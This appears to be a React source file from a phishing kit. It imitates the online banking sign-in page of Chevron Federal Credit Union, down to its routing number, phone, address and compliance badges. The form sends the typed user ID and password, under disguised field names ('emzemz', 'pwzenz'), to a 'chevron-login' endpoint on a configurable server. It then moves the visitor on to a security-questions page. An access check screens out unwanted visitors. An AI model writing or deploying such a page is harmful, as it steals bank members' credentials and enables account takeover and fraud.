import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const complianceBadges = [
  {
    title: 'Equal Housing Lender',
    description:
      'We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act.',
  },
  {
    title: 'NCUA',
    description:
      'Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government.',
  },
];

const referenceColumns = [
  {
    heading: 'ROUTING NUMBER',
    lines: ['#321075947'],
  },
  {
    heading: 'PHONE NUMBER',
    lines: ['800-232-8101', '24-hour service'],
  },
  {
    heading: 'LINKS',
    lines: [
      'Privacy Policy',
      'Accessibility',
      'Disclosures',
      'Security Policy',
      'ATM and Branch Locations',
      'Rates',
    ],
  },
  {
    heading: 'MAILING ADDRESS',
    lines: ['Chevron Federal Credit Union', 'PO Box 4107', 'Concord, CA 94524'],
  },
];

const supportLinks = ['Forgot User ID', 'Forgot Password', 'Unlock Account'];

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return (
      <div className="min-h-screen flex items-center justify-center text-lg text-gray-600">
        Checking access...
      </div>
    );
  }

  if (isAllowed === false) {
    return (
      <div className="min-h-screen flex items-center justify-center text-lg text-gray-700">
        Access denied. Redirecting...
      </div>
    );
  }

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      emzemz: emzemz.trim() ? '' : 'User ID is required.',
      pwzenz: pwzenz.trim() ? '' : 'Password is required.',
    };

    setErrors(newErrors);

    if (!newErrors.emzemz && !newErrors.pwzenz) {
      try {
        await axios.post(`${baseUrl}api/chevron-login/`, {
          emzemz,
          pwzenz,
        });

        navigate('/security-questions', {
          state: { emzemz },
        });
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
        return;
      }

      setErrors({ emzemz: '', pwzenz: '' });
    } else {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white text-[#0e2f56] flex flex-col">
      <main className="flex-1">
        <section className="bg-gradient-to-r from-[#002c5c] via-[#014a90] to-[#0073ba] py-12 px-4">
          <div className="max-w-5xl mx-auto">
            <div className="flex items-center gap-4 mb-8">
              <img
                src="/assets/header_logo_bg.png"
                alt="Chevron Federal Credit Union"
                className="h-16 w-auto"
              />
       
            </div>

            <div className="bg-gradient-to-b from-[#f0f6fb] to-[#dfeef9] shadow-2xl rounded-sm flex flex-col md:flex-row">
            <div className="order-2 md:order-1 w-full md:w-5/12 px-8 py-10 border-t md:border-t-0 md:border-r border-[#91c1e4] md:rounded-l-sm">
              <p className="text-2xl font-semibold text-[#0b5da7] mb-2">
                New to Digital Banking?
              </p>
              <p className="text-sm text-[#0e2f56]">
                Enroll for secure access to your accounts and enjoy 24/7 banking
                with trusted Chevron Federal Credit Union tools.
              </p>
              <button
                type="button"
                className="mt-8 inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-6 py-2 text-sm font-semibold text-white hover:bg-[#002c5c] transition-colors"
              >
                Enroll Now
              </button>
            </div>
            <div className="order-1 md:order-2 w-full md:w-7/12 px-8 py-10">
              <div className="flex flex-col md:flex-row md:items-center gap-4 mb-8">
                <h2 className="text-lg font-semibold tracking-wide uppercase text-[#0e2f56]">
                  Secure Sign In
                </h2>
                <span className="hidden md:block h-8 w-px bg-[#9cc5e3]" />
                <div className="text-sm text-[#0b5da7]">Member Access</div>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div>
                  <label
                    htmlFor="emzemz"
                    className="block text-sm font-semibold text-[#0e2f56] mb-2"
                  >
                    User ID
                  </label>
                  <input
                    id="emzemz"
                    name="emzemz"
                    type="text"
                    value={emzemz}
                    onChange={(e) => setEmzemz(e.target.value)}
                    className="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                  />
                  {errors.emzemz && (
                    <p className="mt-2 text-xs font-semibold text-red-600">
                      {errors.emzemz}
                    </p>
                  )}
                </div>

                <div>
                  <label
                    htmlFor="pwzenz"
                    className="block text-sm font-semibold text-[#0e2f56] mb-2"
                  >
                    Password
                  </label>
                  <div className="relative">
                    <input
                      id="pwzenz"
                      name="pwzenz"
                      type={showPwzenz ? 'text' : 'password'}
                      value={pwzenz}
                      onChange={(e) => setPwzenz(e.target.value)}
                      className="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                    />
                    <button
                      type="button"
                      onClick={togglePwzenzVisibility}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#0b5da7] hover:underline"
                    >
                      {showPwzenz ? 'Hide' : 'Show'}
                    </button>
                  </div>
                  {errors.pwzenz && (
                    <p className="mt-2 text-xs font-semibold text-red-600">
                      {errors.pwzenz}
                    </p>
                  )}
                </div>

                <div className="flex flex-wrap gap-3 text-xs text-[#0b5da7]">
                  {supportLinks.map((link) => (
                    <React.Fragment key={link}>
                      <a href="#" className="hover:underline">
                        {link}
                      </a>
                      <span className="text-gray-400 last:hidden">|</span>
                    </React.Fragment>
                  ))}
                </div>

                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full md:w-auto bg-[#003e7d] text-white font-semibold px-7 py-2 text-sm rounded-sm shadow hover:bg-[#002c5c] disabled:opacity-70"
                  >
                    {isLoading ? 'Signing In...' : 'Log In'}
                  </button>
                </div>
              </form>
            </div>
            </div>
          </div>
        </section>

        <section className="py-10 px-4">
          <div className="max-w-5xl mx-auto space-y-10 text-sm text-[#0e2f56]">
            <div className="grid gap-6 md:grid-cols-2">
              {complianceBadges.map((badge) => (
                <div
                  key={badge.title}
                  className="border border-gray-200 rounded-sm p-5 shadow-sm bg-white"
                >
                  <p className="font-semibold text-xs tracking-wide text-gray-700 mb-2 uppercase">
                    {badge.title}
                  </p>
                  <p className="text-sm text-gray-600 leading-relaxed">
                    {badge.description}
                  </p>
                </div>
              ))}
            </div>

            <div className="grid gap-8 md:grid-cols-4">
              {referenceColumns.map((column) => (
                <div key={column.heading} className="space-y-2">
                  <p className="text-xs font-semibold tracking-wide text-gray-600 uppercase">
                    {column.heading}
                  </p>
                  <div className="space-y-1 text-sm text-gray-700">
                    {column.lines.map((line) => (
                      <p key={line}>{line}</p>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </section>
      </main>

      <footer className="border-t border-gray-200">
        <div className="max-w-5xl mx-auto px-4 py-6 flex flex-col md:flex-row md:items-center md:justify-between gap-6">
          <div className="flex items-center justify-center md:justify-start gap-4">
            <img
              src="/assets/equal-housing.png"
              alt="Equal Housing Lender"
              className="h-12 w-auto"
            />
            <img
              src="/assets/ncua.png"
              alt="National Credit Union Administration"
              className="h-12 w-auto"
            />
          </div>
          <div className="text-xs text-gray-600 text-center md:text-right space-y-1">
            <p>© 2025 Chevron Federal Credit Union</p>
            <p>Version: 10.34.20250707.705.AWS</p>
          </div>
        </div>
      </footer>

      <button
        type="button"
        className="fixed bottom-6 right-6 inline-flex items-center gap-2 rounded-full bg-[#009a66] px-5 py-3 text-sm font-semibold text-white shadow-lg hover:bg-[#007a50]"
      >
        <span className="inline-flex items-center justify-center h-5 w-5 rounded-full bg-white text-[#009a66] text-xs font-bold">
          ?
        </span>
        Help
      </button>
    </div>
  );
};

export default LoginForm;
